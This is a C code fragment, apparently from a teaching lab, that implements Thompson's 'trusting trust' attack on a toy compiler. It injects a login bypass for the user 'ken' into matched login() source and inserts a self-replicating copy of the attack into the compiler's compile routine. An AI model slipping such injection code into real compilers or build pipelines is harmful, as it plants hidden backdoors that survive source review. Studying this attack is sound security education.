/*****************************************************************
    * Step 1:
    */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {";

// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

static char enter[] = "\n";

char *ptr = strstr(program, login_sig);
if (ptr != NULL) {
    char *insert_ptr = strchr(ptr, '\n');
    char tmp = *insert_ptr;
    *insert_ptr = '\0';
    fprintf(fp, "%s", program);
    *program = '\0';
    fprintf(fp, "%s", enter);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", enter);
    fprintf(fp, "%s", insert_ptr+1);
    *insert_ptr = tmp;
}

/*****************************************************************
    * Step 2:
    */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
// static char compile_attack[] 
//             = "printf(\"%s: #include \'attack-seed.c\'\\n\", __FUNCTION__);";

ptr = strstr(program, compile_sig);
if (ptr != NULL) {
    static char assert_str[] = "assert";
    char *insert_ptr = strstr(ptr, assert_str);
    insert_ptr = strchr(insert_ptr, '\n');
    *insert_ptr = '\0';
    fprintf(fp, "%s", program);
    *program = '\0';
    fprintf(fp, "char prog[] = {\n");
    int i;
    for(i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "%s", insert_ptr+1);
}
